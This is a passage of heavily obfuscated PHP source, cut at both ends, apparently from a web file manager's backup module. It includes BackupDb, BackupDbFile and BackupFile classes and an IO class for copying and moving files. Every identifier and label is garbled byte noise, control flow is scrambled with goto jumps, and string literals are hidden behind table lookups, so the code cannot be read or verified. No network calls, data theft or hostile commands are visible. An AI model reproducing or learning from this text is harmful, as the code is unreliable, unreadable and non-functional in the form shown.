[4] . $f³×Û¹Ï . $bß¶³Í [5]); } } } public static function __callStatic($d¨¬¡ê‘Üš, $E¢â÷öäË») { if (isset(self::$_methodListStatic[$d¨¬¡ê‘Üš])) { return call_user_func_array(self::$_methodListStatic[$d¨¬¡ê‘Üš], $E¢â÷öäË»); } else { if (method_exists(self, $d¨¬¡ê‘Üš)) { return call_user_func_array(array(self, $d¨¬¡ê‘Üš), $E¢â÷öäË»); } else { show_json("{$d¨¬¡ê‘Üš}\50\51\x20\156\x6f\164\40\x65\x78\151\x73\x74\73", !1); } } } public static function addMethod($fæŠ‰…¸ø‡, $CëŸ²¿÷Àæ) { self::$_methodList[$fæŠ‰…¸ø‡] = $CëŸ²¿÷Àæ; } public static function addMethodStatic($Fîœ„©äÕâ, $f…½±ÜªË) { self::$_methodListStatic[$Fîœ„©äÕâ] = $f…½±ÜªË; } } goto b‰áìšŠƒ ; bö÷Æğ¹ãÒ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto A£İÆÆ‚¶Ã; F‰®ñãä‰: foreach ($d–ôš„îŒº as $DÖñöÒ½Âª) { $DêÎ™òô‹÷ += $A·™±«ˆßê->model($DÖñöÒ½Âª)->count(); } $DéØÚÕö‰ = new Task($EõåÚ–ŸÍ„[739], $EõåÚ–ŸÍ„[740], $DêÎ™òô‹÷, LNG($EõåÚ–ŸÍ„[741]) . $EõåÚ–ŸÍ„[742] . LNG($EõåÚ–ŸÍ„[743])); foreach ($d–ôš„îŒº as $DÖñöÒ½Âª) { $EšÃôóææ = $dó¹ä¢µí . $DÖñöÒ½Âª . $EõåÚ–ŸÍ„[744]; $b·Ï—¥³ˆµ = null; if ($DÖñöÒ½Âª == $EõåÚ–ŸÍ„[745] && (!isset($d÷ÒÊ‚øŒ”[$EõåÚ–ŸÍ„[714]]) || $d÷ÒÊ‚øŒ”[$EõåÚ–ŸÍ„[714]] == $EõåÚ–ŸÍ„[504])) { $b·Ï—¥³ˆµ = self::$io; } $EˆÎç¸‘§ò += $A·™±«ˆßê->sqlFromDb($DÖñöÒ½Âª, $EšÃôóææ, $DéØÚÕö‰, $b·Ï—¥³ˆµ); } goto DºïĞ¦êÎƒ; A£İÆÆ‚¶Ã: $EõåÚ–ŸÍ„ =& $_SERVER[Šº]; $d÷ÒÊ‚øŒ” = Backup::get(); self::$io = $d÷ÒÊ‚øŒ”[$EõåÚ–ŸÍ„[713]]; goto cîÃÑ¾‘İ; DºïĞ¦êÎƒ: if (isset($DéØÚÕö‰->task[$EõåÚ–ŸÍ„[746]])) { $E¹ìİ©¨³’ = $DéØÚÕö‰->task[$EõåÚ–ŸÍ„[746]] ? $DéØÚÕö‰->task[$EõåÚ–ŸÍ„[746]] : timeFloat(); $CØš…â¨Ş® = $E¹ìİ©¨³’ - $DéØÚÕö‰->task[$EõåÚ–ŸÍ„[747]]; if ($CØš…â¨Ş® >= 0.2) { $DêÎ™òô‹÷ += 1; } } $DéØÚÕö‰->end(); $CŒÎù‚Ï†Û = array($EõåÚ–ŸÍ„[734] => $b¸ÛË­”Ã, $EõåÚ–ŸÍ„[731] => 1, $EõåÚ–ŸÍ„[748] => $DêÎ™òô‹÷, $EõåÚ–ŸÍ„[749] => $EˆÎç¸‘§ò, $EõåÚ–ŸÍ„[750] => time()); goto Fµ×ƒŒŒ¼°; D„ÓîŒŠ: $DêÎ™òô‹÷ = $EˆÎç¸‘§ò = 0; try { $d–ôš„îŒº = $A·™±«ˆßê->db()->getTables(); } catch (Exception $fÒ¦¬Æƒ×¬) { return !1; } $d–ôš„îŒº = array_diff($d–ôš„îŒº, array($EõåÚ–ŸÍ„[737], $EõåÚ–ŸÍ„[738])); goto F‰®ñãä‰; b”ßğ„—çŒ: $dó¹ä¢µí = $this->tmpFilesPath() . $EõåÚ–ŸÍ„[736] . self::$name . $EõåÚ–ŸÍ„[8]; del_dir($dó¹ä¢µí); mk_dir($dó¹ä¢µí); goto D„ÓîŒŠ; fºÃÊÙåÁª: $A·™±«ˆßê = new DbManage($E’Æˆ° èä, $b¸ÛË­”Ã); $CŒÎù‚Ï†Û = array($EõåÚ–ŸÍ„[734] => $b¸ÛË­”Ã, $EõåÚ–ŸÍ„[735] => time()); Backup::set($CŒÎù‚Ï†Û); goto b”ßğ„—çŒ; cîÃÑ¾‘İ: self::$name = $d÷ÒÊ‚øŒ”[$EõåÚ–ŸÍ„[28]]; $E’Æˆ° èä = $GLOBALS[$EõåÚ–ŸÍ„[6]][$EõåÚ–ŸÍ„[17]]; $b¸ÛË­”Ã = $this->_dbType($E’Æˆ° èä); goto fºÃÊÙåÁª; Fµ×ƒŒŒ¼°: Backup::set($CŒÎù‚Ï†Û); if ($DêÎ™òô‹÷ > $EˆÎç¸‘§ò) { write_log(array($EõåÚ–ŸÍ„[751], $CŒÎù‚Ï†Û), $EõåÚ–ŸÍ„[740]); return !1; } return !0; goto FÊÍÒñÑ•æ; FÊÍÒñÑ•æ: } private function _dbType($aÍƒ—ô‰Ñ) { goto C“†«Œ–Ø; C“†«Œ–Ø: $Bõ»Ğ„àâ‰ =& $_SERVER[Šº]; $aÍƒ—ô‰Ñ = array_change_key_case($aÍƒ—ô‰Ñ); $b°±áœÄ§Ì = $aÍƒ—ô‰Ñ[$Bõ»Ğ„àâ‰[752]]; goto cÅ°†íÌá®; dÒÒæ†·: return $b°±áœÄ§Ì; goto b™¢“ª¢…Ô; cÅ°†íÌá®: if ($b°±áœÄ§Ì == $Bõ»Ğ„àâ‰[753]) { $FîÛÆ¥» = explode($Bõ»Ğ„àâ‰[4], $aÍƒ—ô‰Ñ[$Bõ»Ğ„àâ‰[754]]); $b°±áœÄ§Ì = $FîÛÆ¥»[0]; } $bÜˆºêÀ = array($Bõ»Ğ„àâ‰[755] => $Bõ»Ğ„àâ‰[9], $Bõ»Ğ„àâ‰[756] => $Bõ»Ğ„àâ‰[757]); if (isset($bÜˆºêÀ[$b°±áœÄ§Ì])) { $b°±áœÄ§Ì = $bÜˆºêÀ[$b°±áœÄ§Ì]; } goto dÒÒæ†·; b™¢“ª¢…Ô: } private function tmpFilesPath() { $bØÃÉŞ×º— =& $_SERVER[Šº]; $FÎ¢¼öğ•Ë = TEMP_FILES; if ($GLOBALS[$bØÃÉŞ×º—[6]][$bØÃÉŞ×º—[88]][$bØÃÉŞ×º—[758]]) { $FÎ¢¼öğ•Ë = $GLOBALS[$bØÃÉŞ×º—[6]][$bØÃÉŞ×º—[88]][$bØÃÉŞ×º—[758]]; if (!mk_dir($FÎ¢¼öğ•Ë) || !is_writable($FÎ¢¼öğ•Ë) || !IO::mkfile($FÎ¢¼öğ•Ë . $bØÃÉŞ×º—[759])) { $FÎ¢¼öğ•Ë = TEMP_FILES; } } return $FÎ¢¼öğ•Ë; } } class BackupDbFile { public function __construct() { } public function index() { goto aè˜ë»«¢; FØßãë´±Ñ: IO::copy($cÌ¶“—šË§, $cöƒò—•àÔ); $A†ô×¤’->end(); $a™“˜Â ¢Ø = array($cøºÍ†Î—Æ[768] => $aä±Ö™ˆäÒ, $cøºÍ†Î—Æ[769] => time()); goto EçŸ‘ºÂ»; aè˜ë»«¢: $cøºÍ†Î—Æ =& $_SERVER[Šº]; $A×¡Ó«´õ× = Backup::get(); $aË¦‘õ¾ŠÆ = $A×¡Ó«´õ×[$cøºÍ†Î—Æ[28]]; goto e¹ÇÊã†¸´; cî²®»Òˆõ: $Fè†¶É·ô = CONTROLLER_DIR . $cøºÍ†Î—Æ[766]; $cÌ¶“—šË§ = CONTROLLER_DIR . $cøºÍ†Î—Æ[767]; IO::copy($Fè†¶É·ô, $cöƒò—•àÔ); goto FØßãë´±Ñ; e¹ÇÊã†¸´: $a„Ûäˆ— = $this->tmpFilesPath() . "\142\141\x63\153\165\x70\x5f{$aË¦‘õ¾ŠÆ}\x2f"; $cöƒò—•àÔ = $this->backupPath($A×¡Ó«´õ×); if (!($cöƒò—•àÔ = IO::mkdir($cöƒò—•àÔ))) { return !1; } goto cÊ»â“èœÍ; EçŸ‘ºÂ»: Backup::set($a™“˜Â ¢Ø); return !0; goto a°©½‰Ñ; cÊ»â“èœÍ: $Cá¡°Û–‘Ÿ = IO::listPath($a„Ûäˆ—); $AÅç‘âÉëø = isset($Cá¡°Û–‘Ÿ[$cøºÍ†Î—Æ[74]]) ? $Cá¡°Û–‘Ÿ[$cøºÍ†Î—Æ[74]] : array(); $aä±Ö™ˆäÒ = array_sum(array_column($AÅç‘âÉëø, $cøºÍ†Î—Æ[78])); goto dˆŒ¡Œ×“ß; DÂ¹ç¹®áÏ: $A†ô×¤’ = new TaskFileTransfer($cøºÍ†Î—Æ[762], $cøºÍ†Î—Æ[740], count($AÅç‘âÉëø), LNG($cøºÍ†Î—Æ[741]) . $cøºÍ†Î—Æ[447] . LNG($cøºÍ†Î—Æ[743]) . $cøºÍ†Î—Æ[763]); $A†ô×¤’->task[$cøºÍ†Î—Æ[721]] = $aä±Ö™ˆäÒ; foreach ($Cá¡°Û–‘Ÿ[$cøºÍ†Î—Æ[74]] as $FÈƒãè¤‹î) { $D¨‹ªÛö¸– = IO::move($FÈƒãè¤‹î[$cøºÍ†Î—Æ[76]], $cöƒò—•àÔ); if (!$D¨‹ªÛö¸–) { $A†ô×¤’->end(); $b¾¡à¾³»» = IO::getLastError($cøºÍ†Î—Æ[764] . $FÈƒãè¤‹î[$cøºÍ†Î—Æ[76]] . $cøºÍ†Î—Æ[765] . $cöƒò—•àÔ . $cøºÍ†Î—Æ[512]); write_log($b¾¡à¾³»», $cøºÍ†Î—Æ[740]); return !1; } } goto cî²®»Òˆõ; dˆŒ¡Œ×“ß: if (!$aä±Ö™ˆäÒ) { return !1; } $a™“˜Â ¢Ø = array($cøºÍ†Î—Æ[760] => $aä±Ö™ˆäÒ, $cøºÍ†Î—Æ[761] => time()); Backup::set($a™“˜Â ¢Ø); goto DÂ¹ç¹®áÏ; a°©½‰Ñ: } private function backupPath($aÚßÑ˜Ñ¤) { $DŠ¤ÃÖ’Âå =& $_SERVER[Šº]; $c°—•ğÂß± = $aÚßÑ˜Ñ¤[$DŠ¤ÃÖ’Âå[28]]; $e´’âï¦ = Model($DŠ¤ÃÖ’Âå[728])->get($DŠ¤ÃÖ’Âå[729]); $C íÓÄÆî™ = substr(md5($DŠ¤ÃÖ’Âå[730] . $e´’âï¦ . $c°—•ğÂß±), 0, 8); return "\173\x69\x6f\72{$aÚßÑ˜Ñ¤[$DŠ¤ÃÖ’Âå[713]]}\175\57\x64\x61\164\141\142\141\163\145\x2f\142\141\143\x6b\x75\160\57" . $c°—•ğÂß± . $DŠ¤ÃÖ’Âå[71] . $C íÓÄÆî™; } private function tmpFilesPath() { $c¼õö¤›½Ä =& $_SERVER[Šº]; $BÒ™Ò£ëŒÂ = TEMP_FILES; if ($GLOBALS[$c¼õö¤›½Ä[6]][$c¼õö¤›½Ä[88]][$c¼õö¤›½Ä[758]]) { $BÒ™Ò£ëŒÂ = $GLOBALS[$c¼õö¤›½Ä[6]][$c¼õö¤›½Ä[88]][$c¼õö¤›½Ä[758]]; if (!mk_dir($BÒ™Ò£ëŒÂ) || !is_writable($BÒ™Ò£ëŒÂ) || !IO::mkfile($BÒ™Ò£ëŒÂ . $c¼õö¤›½Ä[759])) { $BÒ™Ò£ëŒÂ = TEMP_FILES; } } return $BÒ™Ò£ëŒÂ; } } class BackupFile { public function __construct() { } public function index() { goto e¯İòÔ¢µÖ; dšÛ¬¿­êƒ: $F¹ÈÜËÚ˜Á = (int) Model($_SERVER[Šº][745])->where($fÉˆš¨‘ô)->count($_SERVER[Šº][454]); $E˜ÏÔ»Æ‘÷ = (int) Model($_SERVER[Šº][745])->where($fÉˆš¨‘ô)->sum($_SERVER[Šº][78]); $aÇÙ‹™ÇÅ¾ = new TaskFileTransfer($_SERVER[Šº][772], $_SERVER[Šº][740], $F¹ÈÜËÚ˜Á, LNG($_SERVER[Šº][741]) . $_SERVER[Šº][742] . LNG($_SERVER[Šº][773])); goto c¯ä‡ŸÎ‹ƒ; c˜Â¨†ÂŠ: $Cì“å«„·Ö = array($_SERVER[Šº][786] => 1, $_SERVER[Šº][483] => time(), $_SERVER[Šº][733] => 1, $_SERVER[Šº][783] => $F–óÀ‰õÇÛ, $_SERVER[Šº][775] => $E˜ÏÔ»Æ‘÷, $_SERVER[Šº][774] => $F¹ÈÜËÚ˜Á, $_SERVER[Šº][787] => time()); if ($bšçˆ«º) { $Cì“å«„·Ö[$_SERVER[Šº][784]] = $eè¯ô¹×¶; $Cì“å«„·Ö[$_SERVER[Šº][785]] = $DÛƒò‹×°; } Backup::set($Cì“å«„·Ö); goto a‡ïìâÇÑÃ; e¯İòÔ¢µÖ: $e±¬£¯Ÿ³ = Backup::get(); $F–óÀ‰õÇÛ = $e±¬£¯Ÿ³[$_SERVER[Šº][290]][$_SERVER[Šº][192]][$_SERVER[Šº][454]]; $fÉˆš¨‘ô = array($_SERVER[Šº][455] => array($_SERVER[Šº][770], $F–óÀ‰õÇÛ), $_SERVER[Šº][771] => array($_SERVER[Šº][328], $e±¬£¯Ÿ³[$_SERVER[Šº][713]])); goto dšÛ¬¿­êƒ; a‡ïìâÇÑÃ: $this->_fileFilter($F—¶ìáÏŒ²); return !0; goto Dª—ÒŞ«ÌÀ; c¯ä‡ŸÎ‹ƒ: $aÇÙ‹™ÇÅ¾->task[$_SERVER[Šº][721]] = $E˜ÏÔ»Æ‘÷; $Cì“å«„·Ö = array($_SERVER[Šº][774] => $F¹ÈÜËÚ˜Á, $_SERVER[Šº][775] => $E˜ÏÔ»Æ‘÷, $_SERVER[Šº][776] => time()); Backup::set($Cì“å«„·Ö); goto DÙÅ‘—±Ô½; bÃäÒóôŒ: $DÛƒò‹×° = $eè¯ô¹×¶ = 0; do { $Fˆ„Ù„ëÉİ = $_SERVER[Šº][777]; $CÔ–õ¦²Áì = Model($_SERVER[Šº][745])->where($fÉˆš¨‘ô)->field($Fˆ„Ù„ëÉİ)->order($_SERVER[Šº][778])->selectPage($E®§øçˆ…’, $DÒË‹—çˆ); $bó‘½îàˆâ = !empty($CÔ–õ¦²Áì[$_SERVER[Šº][366]]) ? $CÔ–õ¦²Áì[$_SERVER[Šº][366]] : array(); foreach ($bó‘½îàˆâ as $d£é–ëƒŒ“) { goto cëÎõµó”‚; cëÎõµó”‚: if (!$this->_fileExist($d£é–ëƒŒ“, $F—¶ìáÏŒ², $C—Ææİ“Œî)) { $F¹ÈÜËÚ˜Á -= 1; $E˜ÏÔ»Æ‘÷ -= (int) $d£é–ëƒŒ“[$_SERVER[Šº][78]]; write_log("\x66\151\154\145\x20\x6e\x6f\164\x20\145\170\151\x73\x74\x2e\x66\x69\154\145\111\x44\x3a{$d£é–ëƒŒ“[$_SERVER[Šº][454]]}\54\x20\160\141\x74\x68\x3a{$d£é–ëƒŒ“[$_SERVER[Šº][76]]}", $_SERVER[Šº][779]); continue; } $e¼ïæùá‡ = $d£é–ëƒŒ“[$_SERVER[Šº][76]]; $d‘¨„¾ˆï = "\173\x69\157\72{$e±¬£¯Ÿ³[$_SERVER[Šº][713]]}\x7d" . substr($e¼ïæùá‡, strlen("\173\x69\x6f\72{$d£é–ëƒŒ“[$_SERVER[Šº][780]]}\x7d")); goto cÅá¿ÓÃå; díç¨¨¾â×: $e§îÃ¡µè += $d£é–ëƒŒ“[$_SERVER[Šº][78]]; $eè¯ô¹×¶ += 1; $DÛƒò‹×° += $d£é–ëƒŒ“[$_SERVER[Šº][78]]; goto C¼å„Ì¢¥; cÅá¿ÓÃå: if (IO::exist($d‘¨„¾ˆï)) { $aÇÙ‹™ÇÅ¾->updateFileEnd($d£é–ëƒŒ“[$_SERVER[Šº][28]], $d£é–ëƒŒ“[$_SERVER[Šº][78]]); } else { $d‘¨„¾ˆï = get_path_father($d‘¨„¾ˆï); IO::mkdir($d‘¨„¾ˆï); if (!IO::copy($e¼ïæùá‡, $d‘¨„¾ˆï, $_SERVER[Šº][781])) { write_log($_SERVER[Šº][782] . $e¼ïæùá‡ . $_SERVER[Šº][765] . $d‘¨„¾ˆï . $_SERVER[Šº][512], $_SERVER[Šº][740]); $cÊ¡Õ¨£Ø = !1; break; } } $F–óÀ‰õÇÛ = $d£é–ëƒŒ“[$_SERVER[Šº][454]]; $bšçˆ«º += 1; goto díç¨¨¾â×; C¼å„Ì¢¥: if ($e§îÃ¡µè >= 1024 * 1024 * 100) { $Cì“å«„·Ö = array($_SERVER[Šº][783] => $F–óÀ‰õÇÛ, $_SERVER[Šº][784] => $eè¯ô¹×¶, $_SERVER[Šº][785] => $DÛƒò‹×°); Backup::set($Cì“å«„·Ö); $e§îÃ¡µè = $bšçˆ«º = 0; } goto AêÖ©°ğ; AêÖ©°ğ: } $A¸Ô“•ˆØÖ = count($bó‘½îàˆâ); $DÒË‹—çˆ++; } while ($A¸Ô“•ˆØÖ == $E®§øçˆ…’); $aÇÙ‹™ÇÅ¾->end(); goto c˜Â¨†ÂŠ; fŠ“Î«ƒë¨: $E®§øçˆ…’ = 1000; $e§îÃ¡µè = $bšçˆ«º = 0; $F—¶ìáÏŒ² = array(); goto bÃäÒóôŒ; DÙÅ‘—±Ô½: $cÊ¡Õ¨£Ø = !0; $C—Ææİ“Œî = $this->storeIds(); $DÒË‹—çˆ = 1; goto fŠ“Î«ƒë¨; Dª—ÒŞ«ÌÀ: } private function _fileExist($aÄŸÍ¶ø’÷, &$A”’¿“¼î, $Aä‡íôáÄö) { goto d×ƒÀ¥‰ÓÌ; Bàº»”±•: $A”’¿“¼î = array_merge($A”’¿“¼î, array_to_keyvalue($a¨öÑ‡†’, $AçÖèä™ƒŠ[33], $AçÖèä™ƒŠ[454])); return !1; goto føİë‹ÂÛĞ; E¯“‘»†·’: if (IO::exist($fáäˆ²æŸ­)) { $A”’¿“¼î[] = $aÄŸÍ¶ø’÷[$AçÖèä™ƒŠ[454]]; return !1; } $F²àÒÚ÷É… = array($AçÖèä™ƒŠ[780] => $aÄŸÍ¶ø’÷[$AçÖèä™ƒŠ[780]], $AçÖèä™ƒŠ[76] => array($AçÖèä™ƒŠ[379], "{$fáäˆ²æŸ­}\x25")); $a¨öÑ‡†’ = Model($AçÖèä™ƒŠ[745])->where($F²àÒÚ÷É…)->field($AçÖèä™ƒŠ[455])->select(); goto Bàº»”±•; d×ƒÀ¥‰ÓÌ: $AçÖèä™ƒŠ =& $_SERVER[Šº]; $f¤ğ°Úî²¦ = $aÄŸÍ¶ø’÷[$AçÖèä™ƒŠ[76]]; if (in_array($aÄŸÍ¶ø’÷[$AçÖèä™ƒŠ[454]], $A”’¿“¼î)) { return !1; } goto FŞµ’ë‡÷ñ; FŞµ’ë‡÷ñ: if (!in_array($aÄŸÍ¶ø’÷[$AçÖèä™ƒŠ[780]], $Aä‡íôáÄö)) { return !1; } if (IO::exist($f¤ğ°Úî²¦)) { return !0; } $fáäˆ²æŸ­ = get_path_father($f¤ğ°Úî²¦); goto E¯“‘»†·’; føİë‹ÂÛĞ: } private function _fileFilter($cíå’ˆÂ‘£) { $C„ŞÛ·¦§ =& $_SERVER[Šº]; if (empty($cíå’ˆÂ‘£)) { return; } $D«‘½‡ºé = array($C„ŞÛ·¦§[454] => array($C„ŞÛ·¦§[7], array_unique($cíå’ˆÂ‘£))); $f²×ñìœëÔ = Model($C„ŞÛ·¦§[788])->where($D«‘½‡ºé)->field($C„ŞÛ·¦§[403])->select(); foreach ($f²×ñìœëÔ as $a¯¼¶åŒáï) { Model($C„ŞÛ·¦§[788])->remove($a¯¼¶åŒáï[$C„ŞÛ·¦§[403]], !1); } } private function storeIds() { $cª“ŒÃÙšê =& $_SERVER[Šº]; $c»Şø‡ÇÍÅ = Model($cª“ŒÃÙšê[725])->listData(); $B÷Â©†¦½… = array(); $eÑƒÂ™¬ˆ = $GLOBALS[$cª“ŒÃÙšê[6]][$cª“ŒÃÙšê[88]][$cª“ŒÃÙšê[789]]; foreach ($c»Şø‡ÇÍÅ as $eî‘ªÒù¹) { $e˜õ‘‚Ó­Ó = strtolower($eî‘ªÒù¹[$cª“ŒÃÙšê[94]]); if (!isset($eÑƒÂ™¬ˆ[$e˜õ‘‚Ó­Ó])) { continue; } $e®ĞÙ©ÅÕä = $cª“ŒÃÙšê[72] . (isset($eÑƒÂ™¬ˆ[$e˜õ‘‚Ó­Ó]) ? $eÑƒÂ™¬ˆ[$e˜õ‘‚Ó­Ó] : ucfirst($e˜õ‘‚Ó­Ó)); if (!class_exists($e®ĞÙ©ÅÕä)) { continue; } $B÷Â©†¦½…[] = $eî‘ªÒù¹[$cª“ŒÃÙšê[392]]; } return $B÷Â©†¦½…; } } goto AƒÈÇÊÙ¨¾; B„ğŸ‡àø„: define($_SERVER[Šº][236], 2); define($_SERVER[Šº][237], 3); define($_SERVER[Šº][238], 1); goto F˜£—ÜÇ; Aù¬éŠƒ·á: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($c†æÓÁ×æŞ, $E¬‚¯¿‡ïË) { goto a–ÏÖÅ²¦ƒ; a–ÏÖÅ²¦ƒ: $f³åí«ª÷˜ =& $_SERVER[Šº]; $C¸Ÿ¸áÓù· = $E¬‚¯¿‡ïË; $GLOBALS[$f³åí«ª÷˜[1031]] = $f³åí«ª÷˜[1032] . $c†æÓÁ×æŞ; goto bóÜ¬â³³¿; f³´øåğŠ¶: Hook::trigger($f³åí«ª÷˜[1032] . $c†æÓÁ×æŞ . $f³åí«ª÷˜[1035], $C¸Ÿ¸áÓù·, $f†¹…íÕïÍ); return $f†¹…íÕïÍ; goto EØİÏ„´Óˆ; bóÜ¬â³³¿: Hook::trigger($f³åí«ª÷˜[1032] . $c†æÓÁ×æŞ . $f³åí«ª÷˜[1033], $C¸Ÿ¸áÓù·); $a¦´İÉ‹¿Â = self::driverMake($E¬‚¯¿‡ïË[0]); if (method_exists($a¦´İÉ‹¿Â, $c†æÓÁ×æŞ)) { $f†¹…íÕïÍ = @call_user_func_array(array($a¦´İÉ‹¿Â, $c†æÓÁ×æŞ), $E¬‚¯¿‡ïË); } else { if (method_exists($a¦´İÉ‹¿Â, $f³åí«ª÷˜[1034])) { $f†¹…íÕïÍ = @call_user_func_array(array($a¦´İÉ‹¿Â, $c†æÓÁ×æŞ), $E¬‚¯¿‡ïË); } else { if (method_exists(self, $c†æÓÁ×æŞ)) { $f†¹…íÕïÍ = @call_user_func_array(array(self, $c†æÓÁ×æŞ), $E¬‚¯¿‡ïË); } else { $f†¹…íÕïÍ = call_user_func_array(array(parent, $c†æÓÁ×æŞ), $E¬‚¯¿‡ïË); } } } goto f³´øåğŠ¶; EØİÏ„´Óˆ: } public static function init($fŠ™’¢¨Â˜) { return self::driverMake($fŠ™’¢¨Â˜); } public static function copy($B÷Á•…‰ê¼, $aƒéó˜®Ÿ, $Aåİ†åË = false, $c®ë™ĞÓ” = false) { return self::copyMoveStart($B÷Á•…‰ê¼, $aƒéó˜®Ÿ, $Aåİ†åË, $_SERVER[Šº][526], $c®ë™ĞÓ”); } public static function move($d¸²»Áã¤ô, $cƒšˆ»±ï, $Aª…‹  ó = false, $EˆˆÌÅ ½— = false) { return self::copyMoveStart($d¸²»Áã¤ô, $cƒšˆ»±ï, $Aª…‹  ó, $_SERVER[Šº][528], $EˆˆÌÅ ½—); } private static function copyMoveStart($B¤®¼½’¥…, $Bœ²¦ÙÛÌ¡, $CõÆ”ë¹, $A¡Ë›òãƒÒ, $C÷ãºÄ—ù) { $eàáØ½†•Ò =& $_SERVER[Šº]; $c¹‚ë«ó«Ñ = array($B¤®¼½’¥…, $Bœ²¦ÙÛÌ¡, $CõÆ”ë¹, $C÷ãºÄ—ù); Hook::trigger($eàáØ½†•Ò[1032] . $A¡Ë›òãƒÒ . $eàáØ½†•Ò[1033], $c¹‚ë«ó«Ñ); $Câˆ´Ä÷ˆ = self::copyMove($B¤®¼½’¥…, $Bœ²¦ÙÛÌ¡, $CõÆ”ë¹, $A¡Ë›òãƒÒ, $C÷ãºÄ—ù); Hook::trigger($eàáØ½†•Ò[1032] . $A¡Ë›òãƒÒ . $eàáØ½†•Ò[1035], $c¹‚ë«ó«Ñ, $Câˆ´Ä÷ˆ); return $Câˆ´Ä÷ˆ; } public static function saveFile($Cœ¶ê †‘Š, $d³µ±Åù, $DïÁË”¬ÍÉ = true) { goto dœÀ½æ‚¾; BöÉÃà ­: $fÅ¤ÒÇò‰ = self::copyFile($bôõÀŒ‘, $Cœ¶ê †‘Š, $EÄŒ÷Ë‚¸ƒ, $bôƒöÀ¡¡, $Aå·ïÁ»Ï¦[$E«â­ø¥ã[28]], $fäñ·Åº¤¶); if ($e¾ÀğÛïÏ) { $fÅ¤ÒÇò‰ = $e¾ÀğÛïÏ->getPathOuter($fÅ¤ÒÇò‰); } return $fÅ¤ÒÇò‰; goto aÔ»ôØî­; dœÀ½æ‚¾: $E«â­ø¥ã =& $_SERVER[Šº]; $Aå·ïÁ»Ï¦ = self::info($d³µ±Åù); $bôõÀŒ‘ = self::driverMake($Cœ¶ê †‘Š); goto Cº³Ó¨¡™§; Cº³Ó¨¡™§: $EÄŒ÷Ë‚¸ƒ = self::driverMake($d³µ±Åù); $e¾ÀğÛïÏ = !1; if ($EÄŒ÷Ë‚¸ƒ->pathParse[$E«â­ø¥ã[1036]]) { $Bàãè¿¦´Å = $EÄŒ÷Ë‚¸ƒ->pathParse[$E«â­ø¥ã[1036]]; $e¾ÀğÛïÏ = $EÄŒ÷Ë‚¸ƒ; $EÄŒ÷Ë‚¸ƒ = self::driverMake($Bàãè¿¦´Å); } goto Bİî¡Á½±; Bİî¡Á½±: $bôƒöÀ¡¡ = $EÄŒ÷Ë‚¸ƒ->pathFather($d³µ±Åù); $fäñ·Åº¤¶ = !0; if (!$DïÁË”¬ÍÉ && self::driverIsSame($bôõÀŒ‘, $EÄŒ÷Ë‚¸ƒ)) { $fäñ·Åº¤¶ = !1; } goto BöÉÃà ­; aÔ»ôØî­: } private static function copyMove($E‚®“¿Ä´¡, $eÈ¼ŠÑäŒ, $f´¯‰ô»š©, $e­ô–éƒ, $A·¢£‹Åõ± = false) { goto cÂî›‚×Œğ; F“ôÌ¯—¡: $d¿‡º‡ù„… = self::driverMake($E‚®“¿Ä´¡); $c±°¥Š˜ğØ = self::driverMake($eÈ¼ŠÑäŒ); $CÄ¿˜×Ú± = $e­ô–éƒ == $F®»ùµ§Ÿí[528]; goto e…”Á°Ô«æ; cÂî›‚×Œğ: $F®»ùµ§Ÿí =& $_SERVER[Šº]; if (!$E‚®“¿Ä´¡ || $E‚®“¿Ä´¡ == $F®»ùµ§Ÿí[8] || !$eÈ¼ŠÑäŒ) { return !1; } ignore_timeout(); goto F“ôÌ¯—¡; d‘Å…•Š÷: if ($AÅÓì¬šê‰) { $A„«è‹„Ç« = $AÅÓì¬šê‰->getPathOuter($A„«è‹„Ç«); } return $A„«è‹„Ç«; goto Có–ÊÜœ”Œ; e…”Á°Ô«æ: $AÅÓì¬šê‰ = !1; if ($c±°¥Š˜ğØ->pathParse[$F®»ùµ§Ÿí[1036]]) { $eÈ¼ŠÑäŒ = $c±°¥Š˜ğØ->pathParse[$F®»ùµ§Ÿí[1036]]; $AÅÓì¬šê‰ = $c±°¥Š˜ğØ; $c±°¥Š˜ğØ = self::driverMake($eÈ¼ŠÑäŒ); } self::check($d¿‡º‡ù„…, $E‚®“¿Ä´¡, $c±°¥Š˜ğØ, $eÈ¼ŠÑäŒ); goto FÒ³ñ´ŒÜÇ; B¬¼ Çèáê: $CæÙŒàËï = $d¿‡º‡ù„…->isFile($E‚®“¿Ä´¡); if (!$CæÙŒàËï && $c±°¥Š˜ğØ->getType() == $F®»ùµ§Ÿí[716] && $d¿‡º‡ù„…->getType() == $F®»ùµ§Ÿí[106]) { $A„«è‹„Ç« = $c±°¥Š˜ğØ->copyFolderFromIO($d¿‡º‡ù„…, $E‚®“¿Ä´¡, $eÈ¼ŠÑäŒ, $f´¯‰ô»š©, $CÄ¿˜×Ú±, $A·¢£‹Åõ±); } else { $A„«è‹„Ç« = self::copyPath($d¿‡º‡ù„…, $E‚®“¿Ä´¡, $c±°¥Š˜ğØ, $eÈ¼ŠÑäŒ, $f´¯‰ô»š©, $CÄ¿˜×Ú±, $CæÙŒàËï, $A·¢£‹Åõ±); } if ($A„«è‹„Ç« && $CÄ¿˜×Ú±) { $d¿‡º‡ù„…->remove($E‚®“¿Ä´¡); } goto d‘Å…•Š÷; FÒ³ñ´ŒÜÇ: Hook::trigger($F®»ùµ§Ÿí[73], $d¿‡º‡ù„…, $E‚®“¿Ä´¡, $c±°¥Š˜ğØ, $eÈ¼ŠÑäŒ); $fÁÚÙÑÊÜ = self::driverIsSame($d¿‡º‡ù„…, $c±°¥Š˜ğØ); if ($fÁÚÙÑÊÜ) { if ($e­ô–éƒ == $F®»ùµ§Ÿí[528] && !method_exists($c±°¥Š˜ğØ, $F®»ùµ§Ÿí[1037]) && trim($eÈ¼ŠÑäŒ, $F®»ùµ§Ÿí[8]) == trim($c±°¥Š˜ğØ->pathFather($E‚®“¿Ä´¡), $F®»ùµ§Ÿí[8])) { if ($d¿‡º‡ù„…->pathThis($E‚®“¿Ä´¡) != $A·¢£‹Åõ± && !$d¿‡º‡ù„…->isTypeObject()) { return $d¿‡º‡ù„…->rename($E‚®“¿Ä´¡, $A·¢£‹Åõ±); } return $c±°¥Š˜ğØ->getPathOuter($E‚®“¿Ä´¡); } if (method_exists($c±°¥Š˜ğØ, $e­ô–éƒ)) { return $c±°¥Š˜ğØ->{$e­ô–éƒ}($E‚®“¿Ä´¡, $eÈ¼ŠÑäŒ, $f´¯‰ô»š©); } } goto B¬¼ Çèáê; Có–ÊÜœ”Œ: } private static function 